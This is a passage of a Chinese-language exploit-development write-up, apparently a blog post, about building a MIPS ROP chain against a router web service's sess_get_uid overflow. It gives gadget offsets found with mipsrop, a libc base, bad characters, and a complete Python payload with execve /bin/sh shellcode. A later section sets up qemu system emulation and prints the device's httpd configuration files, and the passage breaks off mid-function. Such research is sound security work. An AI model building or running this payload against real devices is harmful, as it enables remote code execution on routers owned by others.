整个ROP的调用流程参考[H4lo](https://www.anquanke.com/post/id/179510#h3-6)师傅的图。
1.ROP Gadget 1
利用`mipsrop.find("li $a0,1")`寻找到0x57E50处，并且返回时跳转至s1寄存器中地址。
可以将ra处覆盖为`ra=gadget1=0x57E50+libc_base`。之后寻找第二个gadget2将其放入s1，这里不能直接将sleep函数放入s1中，因为sleep函数运行完jr
$ra时，我们控制不了，所以接下来应该是寻找能够控制$ra的gadget2.
2.ROP Gadget 2
利用mipsrop插件中的`mipsrop.tail()`该函数作用是`Prints a lits of all tail call gadgets
(useful for function
calls).`打印出所有函数尾部调用的gadget，这些gadget对函数调用很有效。因为非叶子函数尾部一般是将栈中值返回给寄存器然后再跳转。
选择0x3B8A8作为gadget2。
该gadget的作用是将栈上(sp+0x24)处的内容给到寄存器ra，然后再跳转至s2寄存器中，所以s2寄存器就可以放我们需要的sleep函数的地址。这样的话`s1=gadget2=0x3B8A8+libc_base`，`s2
= sleep+libc_base`。
sleep函数在libuClibc-0.9.30.1.so的偏移为0x56BD0。
3.ROP Gadget 3
执行完sleep函数之后需要控制程序执行栈上shellcode，这里需要用到mipsrop插件的`mipsrop.stackfinder()`，将栈上的shellcode地址存储进寄存器中。
找到0x14F28处的gadget3，所以`$(sp+0x24)=gadget3`作用是将sp+0x18处的值赋给s1，之后跳转到s4寄存器中的地址。
所以接下来我们需要的gadget4是'move $t9,$s1'，跳转到是s1也就是我们的shellcode。
4.ROP Gadget 4
利用`mipsrop.find("move $t9,$s1")`找到一下gadget。
这里选择0x1DD08作为gadget4，`s4=gadget4=0x1DD08+libc_base`。因为其他的gadget可能导致最后出现坏字符，比如我试了0xBB44，结果真实地址为0xBB44+0x76738000=0x76743b44，然而3b在sess_get_uid的时候就被截断了,所以导致rop没有构造成功。
到这里所有的gadget都找齐了，接下来开始构造exp。
5.构造exp
整个payload是这样的：
这里顺便提下构造exp时有可能的坏字符：0x20（空格）、0x00（结束符）、0x3a（冒号）、0x3f（问号）、0x3b（分号）、0x0a(\n换行符)等。具体还要看程序如何处理以及转义。
    libc_base = 0x76738000
    sleep = 0x56BD0
    gadget1 = 0x57E50
    gadget2 = 0x3B8A8
    gadget3 = 0x14F28
    gadget4 = 0x1DD08
    # Linux/MIPS - execve /bin/sh - 48 bytes
    shellcode = "\xff\xff\x06\x28"  # slti $a2, $zero, -1
    shellcode += "\x62\x69\x0f\x3c"  # lui $t7, 0x6962
    shellcode += "\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
    shellcode += "\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
    shellcode += "\x73\x68\x0e\x3c"  # lui $t6, 0x6873
    shellcode += "\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
    shellcode += "\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
    shellcode += "\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
    shellcode += "\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
    shellcode += "\xff\xff\x05\x28"  # slti $a1, $zero, -1
    shellcode += "\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
    shellcode += "\x0c\x01\x01\x01"  # syscall 0x40404
    payload = 'A' * 0x3cd
    payload += 'A' * 4                        # s0
    payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() && move $ra,$(sp+0x24) && jr s2
    payload += p32(libc_base + sleep)         # s2 = jr $(sp+0x24)
    payload += 'A' * 4                        # s3
    payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") && jr shellcode
    payload += 'A' * 4                        # s5
    payload += 'A' * 4                        # s6
    payload += 'A' * 4                        # s7
    payload += 'A' * 4                        # fp
    payload += p32(libc_base + gadget1)       # fisrt_ra = mipsrop.find("li $a0,1") && jr s1
    payload += 'B' * 0x24 # mipsrop.tail() 0x24B padding
    payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() && move s1,$(sp+0x18) && jr $s4
    payload += 'c' * 0x18 # mipsrop.stackfinder() 0x18B padding
    payload += shellcode
调试结果显示能够进入到Shellcode去执行。
但是之后一直出不去，获取不到shell。
所以到目前为止，利用qemu用户模式还没有成功获取shell！！！
# 05-qemu系统模式
我们这里主要是为了在qemu虚拟机中重现http服务。通过查看文件系统中的`/bin、/sbin、/usr/bin、/usr/sbin`可以知道`/sbin/httpd`应该是用于监听web端口的http服务，同时查看`/htdocs/web`文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。
## 5.1-环境配置
`find ./ -name '*http*'`找到web配置文件httpcfg.php。
    ./etc/services/HTTP/httpcfg.php
    ./etc/services/HTTP/httpsvcs.php
    ./usr/sbin/httpc
    ./sbin/httpd
查看httpcf.php
    Umask 026
    PIDFile /var/run/httpd.pid
    #LogGMT On
    #ErrorLog /dev/console
    Tuning
    {
        NumConnections 15
        BufSize 12288
        InputBufSize 4096
        ScriptBufSize 4096
        NumHeaders 100
        Timeout 60
        ScriptTimeout 60
    }
    Control
    {
        Types
        {
            text/html   { html htm }
            text/xml    { xml }
            text/plain  { txt }
            image/gif   { gif }
            image/jpeg  { jpg }
            text/css    { css }
            application/octet-stream { * }
        }
        Specials
        {
            Dump        { /dump }
            CGI         { cgi }
            Imagemap    { map }
            Redirect    { url }
        }
        External
        {
            /usr/sbin/phpcgi { php }
        }
    }
     0)    echo
            "           External".                      "\n".
            "           {".                             "\n".
            "               /usr/sbin/phpcgi { router_info.xml }"."\n".
            "               /usr/sbin/phpcgi { post_login.xml }"."\n".
            "           }".                             "\n";   
        echo
            "       }".                                 "\n";
        if ($smart404 != "")
        {
            echo
            '       Control'.                           '\n'.
            '       {'.                                 '\n'.
            '           Alias /smart404'.               '\n'.
            '           Location /htdocs/smart404'.     '\n'.
            '       }'.                                 '\n';
        }
        if ($hnap > 0)
        {
            echo
            "       Control".                           "\n".
            "       {".                                 "\n".
            "           Alias /HNAP1".                  "\n".
            "           Location /htdocs/HNAP1".        "\n".
            "           External".                      "\n".
            "           {".                             "\n".
            "               /usr/sbin/hnap { hnap }".   "\n".
            "           }".                             "\n".
            "           IndexNames { index.hnap }".     "\n".
            "       }".                                 "\n";
        }
        echo
            "   }".                                     "\n".
            "}".                                        "\n";
    }
    function ssdp_server($sname, $uid, $ifname, $af, $ipaddr)
    {
        if ($af=="inet6") return;
        echo
            "Server".                                   "\n".
            "{".                                        "\n".